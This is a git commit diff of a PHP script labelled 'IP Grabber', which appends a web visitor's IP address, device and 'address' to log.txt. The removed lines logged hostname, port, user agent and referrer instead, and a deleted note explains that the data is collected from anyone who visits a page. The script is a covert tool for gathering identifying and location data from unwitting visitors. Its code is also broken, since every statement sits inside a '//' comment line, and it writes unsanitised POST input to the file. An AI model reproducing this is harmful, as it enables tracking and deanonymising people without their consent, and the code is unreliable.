6f8c4b435de5329edb4f0cf336917f841c05989e
Jkean2012 <Jkean2012@outlook.com>
2025-01-11 14:27:29 -0500

    Update log_ip.php

--- log_ip.php
+++ log_ip.php
@@ -1,6 +1,4 @@
 <?php //IP Grabber
-//Retrieve data from POST request $ip = $_POST['ip']; $port = $_POST['port']; $agent = $_POST['agent']; $ref = $_POST['ref']; $hostname = $_POST['hostname'];
+//Retrieve data from POST request $ip = $_POST['ip']; $device = $_POST['device']; $address = $_POST['address'];
 
-//Print IP, Hostname, Port Number, User Agent and Referer To Log.TXT $fh = fopen('log.txt', 'a'); fwrite($fh, 'IP Address: '."".$ip ."\n"); fwrite($fh, 'Hostname: '."".$hostname ."\n"); fwrite($fh, 'Port Number: '."".$port ."\n"); fwrite($fh, 'User Agent: '."".$agent ."\n"); fwrite($fh, 'HTTP Referer: '."".$ref ."\n\n"); fclose($fh); ?>
-
-This code will log the IP address, hostname, port number, user agent, and referrer of anyone who visits the HTML page. The data is sent to the PHP file using an asynchronous POST request, which then writes the data to a text file called log.txt.
+//Print IP, Device, and Address To Log.TXT $fh = fopen('log.txt', 'a'); fwrite($fh, 'IP Address: '."".$ip ."\n"); fwrite($fh, 'Device: '."".$device ."\n"); fwrite($fh, 'Address: '."".$address ."\n\n"); fclose($fh); ?>
